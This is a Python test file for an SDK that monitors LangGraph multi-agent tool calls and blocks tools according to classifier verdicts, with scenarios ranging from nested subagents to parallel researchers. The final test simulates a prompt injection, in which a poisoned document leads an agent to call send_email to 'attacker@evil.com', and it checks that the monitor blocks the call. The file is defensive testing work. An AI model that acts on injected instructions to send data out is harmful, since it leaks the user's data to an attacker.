"""Block-mode correctness tests under multi-agent scenarios.

Each test simulates the PairedEvent stream that each S1-S8 scenario would
emit and exercises the SDK's block-mode correlation directly.  No real
LLM calls; no running backend.

Scenarios mirror the validated shapes from the multi-agent work:
    S1 subagents-as-tools - director → worker (nested)
    S2 handoffs           - triage → specialist (sequential)
    S3 router             - parallel fan-out via Send()
    S4 hierarchical       - 3-level deep (director → team-lead → worker)
    S5 custom workflow    - deterministic + LLM nodes mixed
    S6 swarm              - back-and-forth handoffs (Alice ↔ Bob)
    S7 supervisor         - central dispatcher to N workers
    S8 deep research      - parallel researchers via asyncio.gather

The invariant under test: for EVERY pattern, each ToolNode invocation
blocks on the verdict of the LLM that emitted its specific tool_call.id -
never a sibling, never a parent, never a stale global.
"""

# pyright: reportPrivateUsage=false

from __future__ import annotations

import asyncio
from collections.abc import Iterator
from pathlib import Path  # noqa: TC003
from typing import Any

import adrian
import pytest
from adrian.format.types import AgentContext, LlmPairData, PairedEvent
from adrian.proto import event_pb2 as pb
from langchain_core.messages import AIMessage
from langchain_core.runnables.config import RunnableConfig, ensure_config
from langgraph._internal._constants import CONF, CONFIG_KEY_RUNTIME
from langgraph.prebuilt import ToolNode
from langgraph.runtime import Runtime


@pytest.fixture(autouse=True)  # pyright: ignore[reportUntypedFunctionDecorator]
def _cleanup() -> Iterator[None]:  # pyright: ignore[reportUnusedFunction]
    """Start each test from a clean SDK state."""
    yield
    adrian.shutdown()


# ------------------------------------------------------------------
# Helpers
# ------------------------------------------------------------------


def _runtime_config() -> RunnableConfig:
    """Minimal RunnableConfig with a Runtime injected for ToolNode.ainvoke."""
    return ensure_config({CONF: {CONFIG_KEY_RUNTIME: Runtime()}})


def _llm_pair(
    event_id: str,
    run_id: str,
    agent_id: str,
    tool_calls: list[dict[str, Any]],
    parent_run_id: str = "",
) -> PairedEvent:
    return PairedEvent(
        event_id=event_id,
        invocation_id="inv-1",
        session_id="sess-1",
        run_id=run_id,
        parent_run_id=parent_run_id,
        timestamp="2026-01-01T00:00:00Z",
        pair_type="llm",
        agent=AgentContext(agent_id=agent_id),
        parent=None,
        data=LlmPairData(
            model="ChatAnthropic",
            output=f"calling tools from {agent_id}",
            tool_calls=tool_calls,  # type: ignore[arg-type]
        ),
    )


def _block_policy() -> pb.PolicySnapshot:
    """A typical BLOCK-mode policy snapshot with M3 + M4 in scope."""
    return pb.PolicySnapshot(
        mode=pb.MODE_BLOCK,
        policy_m3=True,
        policy_m4=True,
    )


def _init_block_mode(tmp_path: Path, block_timeout: float = 1.0) -> Any:
    """Initialise SDK in MODE_BLOCK with a mock-connected WebSocketClient.

    Drives the LoginAck-supplied state directly: ``MODE_BLOCK`` plus
    ``policy_m3`` and ``policy_m4`` in scope.  Returns the ws client
    already "connected" so patched ToolNode invocations can look up
    verdicts without spawning real sockets.
    """
    adrian.init(
        api_key="k",
        log_file=str(tmp_path / "events.jsonl"),
        auto_instrument=True,
        ws_url="ws://x",
        block_timeout=block_timeout,
    )

    ws = adrian._ws_client
    assert ws is not None
    ws._mode = pb.MODE_BLOCK
    ws._policy = _block_policy()
    ws._login_ack_received.set()
    ws._connected.set()

    return ws


def _tool(name: str, captured: list[str]) -> Any:
    """Build a named async stub tool that records its argument."""

    async def _impl(x: str) -> str:
        """Stub tool."""
        captured.append(f"{name}:{x}")

        return x

    _impl.__name__ = name

    return _impl


def _tool_node(tools: list[Any]) -> Any:
    """Late-import wrapper so collection doesn't fail if langgraph isn't ready."""

    return ToolNode(tools)


def _block_verdict(event_id: str) -> pb.Verdict:
    """Verdict that halts under BLOCK-mode (M4 in-scope)."""
    return pb.Verdict(
        event_id=event_id,
        session_id="sess-1",
        mad_code="M4_a",
        policy=_block_policy(),
    )


def _notify_verdict(event_id: str) -> pb.Verdict:
    """Verdict that continues under BLOCK-mode (M2 out-of-scope)."""
    return pb.Verdict(
        event_id=event_id,
        session_id="sess-1",
        mad_code="M2",
        policy=_block_policy(),
    )


def _preload_verdict(ws: Any, event_id: str, verdict: pb.Verdict) -> None:
    """Register and pre-resolve a verdict future for ``event_id``."""
    fut = ws.register_pending(event_id)
    fut.set_result(verdict)


# ------------------------------------------------------------------
# Correlation unit tests, the heart of the race fix
# ------------------------------------------------------------------


class TestToolCallIdCorrelation:
    """Every tool_call.id lands in the map keyed to its LLM's event_id."""

    async def test_single_llm_multiple_tool_calls_share_event_id(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)

        await ws.on_paired_event(
            _llm_pair(
                "evt-A",
                "run-A",
                "agent-A",
                [
                    {"id": "tc-1", "name": "t1", "args": {}},
                    {"id": "tc-2", "name": "t2", "args": {}},
                ],
            ),
        )

        assert ws._tool_call_id_to_event_id["tc-1"] == "evt-A"
        assert ws._tool_call_id_to_event_id["tc-2"] == "evt-A"

    async def test_concurrent_llm_pairs_do_not_cross_contaminate(
        self, tmp_path: Path
    ) -> None:
        """Two parallel LLM pairs with distinct tool_call IDs map independently."""
        ws = _init_block_mode(tmp_path)

        llm_a = _llm_pair(
            "evt-A",
            "run-A",
            "agent-A",
            [{"id": "tc-alpha", "name": "t", "args": {}}],
        )
        llm_b = _llm_pair(
            "evt-B",
            "run-B",
            "agent-B",
            [{"id": "tc-beta", "name": "t", "args": {}}],
        )

        # Interleaved concurrent delivery
        await asyncio.gather(ws.on_paired_event(llm_a), ws.on_paired_event(llm_b))

        assert ws._tool_call_id_to_event_id["tc-alpha"] == "evt-A"
        assert ws._tool_call_id_to_event_id["tc-beta"] == "evt-B"


# ------------------------------------------------------------------
# Scenario-shaped block-mode tests
# ------------------------------------------------------------------


class TestS1SubagentsAsTools:
    """Director calls worker-as-tool.  The sub-agent has its own tool_calls.

    Under block mode, the director's tool (invoking the worker) blocks on
    the director's verdict; the worker's own internal tools block on the
    worker's verdict.  Distinct event_ids, distinct blocking decisions.
    """

    async def test_director_and_worker_verdicts_route_separately(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []
        director_tool = _tool("call_worker", captured)
        worker_tool = _tool("worker_inner", captured)

        # Director LLM pair, calls the worker
        await ws.on_paired_event(
            _llm_pair(
                "evt-director",
                "run-director",
                "director",
                [{"id": "tc-director", "name": "call_worker", "args": {"x": "d"}}],
            ),
        )
        # Worker LLM pair, calls its own internal tool
        await ws.on_paired_event(
            _llm_pair(
                "evt-worker",
                "run-worker",
                "director|worker",
                [{"id": "tc-worker", "name": "worker_inner", "args": {"x": "w"}}],
                parent_run_id="run-director",
            ),
        )

        # Block director, allow worker
        _preload_verdict(ws, "evt-director", _block_verdict("evt-director"))
        _preload_verdict(ws, "evt-worker", _notify_verdict("evt-worker"))

        # Director tool invocation
        director_tn = _tool_node([director_tool])
        dir_state: dict[str, Any] = {
            "messages": [
                AIMessage(
                    content="",
                    tool_calls=[
                        {"id": "tc-director", "name": "call_worker", "args": {"x": "d"}}
                    ],
                )
            ],
        }
        dir_result = await director_tn.ainvoke(dir_state, config=_runtime_config())
        assert "BLOCKED" in dir_result["messages"][0].content
        assert "call_worker:d" not in captured

        # Worker tool invocation
        worker_tn = _tool_node([worker_tool])
        worker_state: dict[str, Any] = {
            "messages": [
                AIMessage(
                    content="",
                    tool_calls=[
                        {"id": "tc-worker", "name": "worker_inner", "args": {"x": "w"}}
                    ],
                )
            ],
        }
        await worker_tn.ainvoke(worker_state, config=_runtime_config())
        assert captured == ["worker_inner:w"]


class TestS2Handoff:
    """Triage hands off to specialist (sequential).  Only one agent active at a time."""

    async def test_specialist_block_doesnt_affect_prior_triage_allow(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []
        triage_tool = _tool("triage_route", captured)
        specialist_tool = _tool("specialist_action", captured)

        await ws.on_paired_event(
            _llm_pair(
                "evt-triage",
                "run-triage",
                "triage",
                [{"id": "tc-triage", "name": "triage_route", "args": {"x": "t"}}],
            ),
        )
        await ws.on_paired_event(
            _llm_pair(
                "evt-spec",
                "run-spec",
                "specialist",
                [{"id": "tc-spec", "name": "specialist_action", "args": {"x": "s"}}],
            ),
        )

        _preload_verdict(ws, "evt-triage", _notify_verdict("evt-triage"))
        _preload_verdict(ws, "evt-spec", _block_verdict("evt-spec"))

        t_tn = _tool_node([triage_tool])
        await t_tn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {
                                "id": "tc-triage",
                                "name": "triage_route",
                                "args": {"x": "t"},
                            }
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        assert captured == ["triage_route:t"]

        s_tn = _tool_node([specialist_tool])
        s_result = await s_tn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {
                                "id": "tc-spec",
                                "name": "specialist_action",
                                "args": {"x": "s"},
                            }
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        assert "BLOCKED" in s_result["messages"][0].content
        assert "specialist_action:s" not in captured


class TestS3RouterFanout:
    """Deterministic router fans out to N parallel specialists.

    THE critical race test, with the old last_llm_event_id, any sibling's
    verdict could wrong-block an agent's tool.  Under tool_call.id
    correlation, each agent is isolated.
    """

    async def test_parallel_specialists_block_independently(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []
        math_tool = _tool("math", captured)
        writing_tool = _tool("writing", captured)
        search_tool = _tool("search", captured)

        # Three specialists emit concurrently (interleaved)
        pairs = [
            _llm_pair(
                "evt-math",
                "run-math",
                "math_agent",
                [{"id": "tc-math", "name": "math", "args": {"x": "m"}}],
            ),
            _llm_pair(
                "evt-writing",
                "run-writing",
                "writing_agent",
                [{"id": "tc-writing", "name": "writing", "args": {"x": "w"}}],
            ),
            _llm_pair(
                "evt-search",
                "run-search",
                "search_agent",
                [{"id": "tc-search", "name": "search", "args": {"x": "s"}}],
            ),
        ]

        await asyncio.gather(*(ws.on_paired_event(p) for p in pairs))

        # Block only math; writing and search allowed
        _preload_verdict(ws, "evt-math", _block_verdict("evt-math"))
        _preload_verdict(ws, "evt-writing", _notify_verdict("evt-writing"))
        _preload_verdict(ws, "evt-search", _notify_verdict("evt-search"))

        async def _run(tn: Any, tc: dict[str, Any]) -> Any:
            state = {"messages": [AIMessage(content="", tool_calls=[tc])]}

            return await tn.ainvoke(state, config=_runtime_config())

        # Invoke the three ToolNodes concurrently, the real race scenario
        math_tn = _tool_node([math_tool])
        writing_tn = _tool_node([writing_tool])
        search_tn = _tool_node([search_tool])

        results = await asyncio.gather(
            _run(math_tn, {"id": "tc-math", "name": "math", "args": {"x": "m"}}),
            _run(
                writing_tn, {"id": "tc-writing", "name": "writing", "args": {"x": "w"}}
            ),
            _run(search_tn, {"id": "tc-search", "name": "search", "args": {"x": "s"}}),
        )

        # Math must be blocked; writing + search must have run.
        assert "BLOCKED" in results[0]["messages"][0].content
        assert "math:m" not in captured
        assert "writing:w" in captured
        assert "search:s" in captured


class TestS4Hierarchical:
    """3 levels deep: director → team-lead → worker."""

    async def test_middle_level_block_doesnt_affect_other_levels(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []
        director_tool = _tool("delegate_to_lead", captured)
        lead_tool = _tool("delegate_to_worker", captured)
        worker_tool = _tool("do_work", captured)

        await ws.on_paired_event(
            _llm_pair(
                "evt-dir",
                "run-dir",
                "director",
                [{"id": "tc-dir", "name": "delegate_to_lead", "args": {"x": "d"}}],
            ),
        )
        await ws.on_paired_event(
            _llm_pair(
                "evt-lead",
                "run-lead",
                "director|team_lead",
                [{"id": "tc-lead", "name": "delegate_to_worker", "args": {"x": "l"}}],
                parent_run_id="run-dir",
            ),
        )
        await ws.on_paired_event(
            _llm_pair(
                "evt-worker",
                "run-worker",
                "director|team_lead|worker",
                [{"id": "tc-worker", "name": "do_work", "args": {"x": "w"}}],
                parent_run_id="run-lead",
            ),
        )

        _preload_verdict(ws, "evt-dir", _notify_verdict("evt-dir"))
        _preload_verdict(ws, "evt-lead", _block_verdict("evt-lead"))
        _preload_verdict(ws, "evt-worker", _notify_verdict("evt-worker"))

        # Director → runs
        dir_tn = _tool_node([director_tool])
        await dir_tn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {
                                "id": "tc-dir",
                                "name": "delegate_to_lead",
                                "args": {"x": "d"},
                            }
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        assert "delegate_to_lead:d" in captured

        # Team lead → BLOCKED
        lead_tn = _tool_node([lead_tool])
        lead_result = await lead_tn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {
                                "id": "tc-lead",
                                "name": "delegate_to_worker",
                                "args": {"x": "l"},
                            }
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        assert "BLOCKED" in lead_result["messages"][0].content

        # Worker → runs (its verdict is BENIGN, independent of the middle block)
        worker_tn = _tool_node([worker_tool])
        await worker_tn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {"id": "tc-worker", "name": "do_work", "args": {"x": "w"}}
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        assert "do_work:w" in captured


class TestS6SwarmHandoffs:
    """Alice ↔ Bob back-and-forth.  Each turn is a distinct LLM pair."""

    async def test_alternating_turns_correlate_by_tool_call_id(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []
        alice_tool = _tool("alice_action", captured)
        bob_tool = _tool("bob_action", captured)

        # Alice turn 1
        await ws.on_paired_event(
            _llm_pair(
                "evt-a1",
                "run-a1",
                "Alice",
                [{"id": "tc-a1", "name": "alice_action", "args": {"x": "a1"}}],
            ),
        )
        # Bob turn 1
        await ws.on_paired_event(
            _llm_pair(
                "evt-b1",
                "run-b1",
                "Bob",
                [{"id": "tc-b1", "name": "bob_action", "args": {"x": "b1"}}],
            ),
        )
        # Alice turn 2
        await ws.on_paired_event(
            _llm_pair(
                "evt-a2",
                "run-a2",
                "Alice",
                [{"id": "tc-a2", "name": "alice_action", "args": {"x": "a2"}}],
            ),
        )

        _preload_verdict(ws, "evt-a1", _notify_verdict("evt-a1"))
        _preload_verdict(ws, "evt-b1", _block_verdict("evt-b1"))
        _preload_verdict(ws, "evt-a2", _notify_verdict("evt-a2"))

        alice_tn = _tool_node([alice_tool])
        bob_tn = _tool_node([bob_tool])

        # Interleaved invocation
        await alice_tn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {"id": "tc-a1", "name": "alice_action", "args": {"x": "a1"}}
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        bob_result = await bob_tn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {"id": "tc-b1", "name": "bob_action", "args": {"x": "b1"}}
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        await alice_tn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {"id": "tc-a2", "name": "alice_action", "args": {"x": "a2"}}
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )

        assert "alice_action:a1" in captured
        assert "BLOCKED" in bob_result["messages"][0].content
        assert "bob_action:b1" not in captured
        assert "alice_action:a2" in captured


class TestS7Supervisor:
    """One supervisor dispatches to N workers; supervisor resumes after each."""

    async def test_supervisor_allowed_workers_pass_one_blocked(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []

        # Supervisor emits 3 LLM pairs, each one dispatching to a different worker
        for i in range(3):
            await ws.on_paired_event(
                _llm_pair(
                    f"evt-sup-{i}",
                    f"run-sup-{i}",
                    "supervisor",
                    [
                        {
                            "id": f"tc-sup-{i}",
                            "name": f"dispatch_{i}",
                            "args": {"x": str(i)},
                        }
                    ],
                ),
            )
            await ws.on_paired_event(
                _llm_pair(
                    f"evt-w-{i}",
                    f"run-w-{i}",
                    f"supervisor|worker_{i}",
                    [
                        {
                            "id": f"tc-w-{i}",
                            "name": f"worker_action_{i}",
                            "args": {"x": str(i)},
                        }
                    ],
                    parent_run_id=f"run-sup-{i}",
                ),
            )

        # Allow everything except worker 1
        for i in range(3):
            _preload_verdict(ws, f"evt-sup-{i}", _notify_verdict(f"evt-sup-{i}"))
            v = (
                _block_verdict(f"evt-w-{i}")
                if i == 1
                else _notify_verdict(f"evt-w-{i}")
            )
            _preload_verdict(ws, f"evt-w-{i}", v)

        for i in range(3):
            wt = _tool(f"worker_action_{i}", captured)
            tn = _tool_node([wt])
            state = {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {
                                "id": f"tc-w-{i}",
                                "name": f"worker_action_{i}",
                                "args": {"x": str(i)},
                            }
                        ],
                    )
                ]
            }
            result = await tn.ainvoke(state, config=_runtime_config())

            if i == 1:
                assert "BLOCKED" in result["messages"][0].content

        assert "worker_action_0:0" in captured
        assert "worker_action_1:1" not in captured
        assert "worker_action_2:2" in captured


class TestS8DeepResearchParallel:
    """Supervisor dispatches parallel researchers via asyncio.gather."""

    async def test_concurrent_researchers_verdicts_do_not_race(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []
        researcher_tools = [_tool(f"research_{i}", captured) for i in range(4)]

        # All 4 researchers' LLM pairs arrive concurrently
        pairs = [
            _llm_pair(
                f"evt-r-{i}",
                f"run-r-{i}",
                f"supervisor|researcher_{i}",
                [{"id": f"tc-r-{i}", "name": f"research_{i}", "args": {"x": str(i)}}],
                parent_run_id="run-supervisor",
            )
            for i in range(4)
        ]
        await asyncio.gather(*(ws.on_paired_event(p) for p in pairs))

        # Block researchers 1 and 3; allow 0 and 2
        for i in range(4):
            v = (
                _block_verdict(f"evt-r-{i}")
                if i in {1, 3}
                else _notify_verdict(f"evt-r-{i}")
            )
            _preload_verdict(ws, f"evt-r-{i}", v)

        async def _run(i: int) -> Any:
            tn = _tool_node([researcher_tools[i]])
            state = {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {
                                "id": f"tc-r-{i}",
                                "name": f"research_{i}",
                                "args": {"x": str(i)},
                            }
                        ],
                    )
                ]
            }

            return await tn.ainvoke(state, config=_runtime_config())

        results = await asyncio.gather(*(_run(i) for i in range(4)))

        assert "research_0:0" in captured
        assert "research_1:1" not in captured
        assert "BLOCKED" in results[1]["messages"][0].content
        assert "research_2:2" in captured
        assert "research_3:3" not in captured
        assert "BLOCKED" in results[3]["messages"][0].content


class TestS5CustomWorkflow:
    """Mixed deterministic + LLM nodes.  Deterministic nodes emit no events."""

    async def test_sequential_llm_nodes_correlate_correctly(
        self, tmp_path: Path
    ) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []
        analyst_tool = _tool("analyze", captured)
        reviewer_tool = _tool("review", captured)

        # analyst → (deterministic node, no event) → reviewer
        await ws.on_paired_event(
            _llm_pair(
                "evt-analyst",
                "run-analyst",
                "analyst",
                [{"id": "tc-analyst", "name": "analyze", "args": {"x": "a"}}],
            ),
        )
        await ws.on_paired_event(
            _llm_pair(
                "evt-reviewer",
                "run-reviewer",
                "reviewer",
                [{"id": "tc-reviewer", "name": "review", "args": {"x": "r"}}],
            ),
        )

        _preload_verdict(ws, "evt-analyst", _notify_verdict("evt-analyst"))
        _preload_verdict(ws, "evt-reviewer", _block_verdict("evt-reviewer"))

        atn = _tool_node([analyst_tool])
        await atn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {"id": "tc-analyst", "name": "analyze", "args": {"x": "a"}}
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        assert "analyze:a" in captured

        rtn = _tool_node([reviewer_tool])
        r_result = await rtn.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {"id": "tc-reviewer", "name": "review", "args": {"x": "r"}}
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        assert "BLOCKED" in r_result["messages"][0].content
        assert "review:r" not in captured


# ------------------------------------------------------------------
# Tool-output-induced malicious action (user's point 4)
# ------------------------------------------------------------------


class TestMaliciousToolOutputBlocksNextTurn:
    """Sequence: benign LLM call → tool returns injection → LLM-2 reasons about it → BLOCK.

    The classifier doesn't catch the tool output itself (Approach 1), but
    it catches the reasoning that follows on the NEXT LLM turn, blocking
    the follow-up tool before it runs.  This is the "catch on next turn"
    guarantee, no bypass as long as the agent is the only one making
    tool calls.
    """

    async def test_follow_up_tool_call_is_blocked(self, tmp_path: Path) -> None:
        ws = _init_block_mode(tmp_path)
        captured: list[str] = []
        benign_tool = _tool("read_file", captured)
        exfil_tool = _tool("send_email", captured)

        # Turn 1: benign LLM decision to call read_file
        await ws.on_paired_event(
            _llm_pair(
                "evt-1",
                "run-1",
                "agent",
                [{"id": "tc-1", "name": "read_file", "args": {"x": "doc.md"}}],
            ),
        )
        # Tool runs, returns malicious payload (poisoned doc). Simulated by
        # simply recording that it ran, the SDK doesn't store tool output
        # internally in this test.
        _preload_verdict(ws, "evt-1", _notify_verdict("evt-1"))

        tn1 = _tool_node([benign_tool])
        await tn1.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {"id": "tc-1", "name": "read_file", "args": {"x": "doc.md"}}
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )
        assert "read_file:doc.md" in captured  # turn 1 ran

        # Turn 2: agent reasons about the poisoned output and wants to
        # exfiltrate.  Classifier catches the reasoning here.
        await ws.on_paired_event(
            _llm_pair(
                "evt-2",
                "run-2",
                "agent",
                [
                    {
                        "id": "tc-2",
                        "name": "send_email",
                        "args": {"x": "attacker@evil.com"},
                    }
                ],
            ),
        )
        _preload_verdict(ws, "evt-2", _block_verdict("evt-2"))

        tn2 = _tool_node([exfil_tool])
        result = await tn2.ainvoke(
            {
                "messages": [
                    AIMessage(
                        content="",
                        tool_calls=[
                            {
                                "id": "tc-2",
                                "name": "send_email",
                                "args": {"x": "attacker@evil.com"},
                            }
                        ],
                    )
                ]
            },
            config=_runtime_config(),
        )

        # Turn 2 is blocked before the exfil tool runs.
        assert "BLOCKED" in result["messages"][0].content
        assert not any("send_email" in c for c in captured)
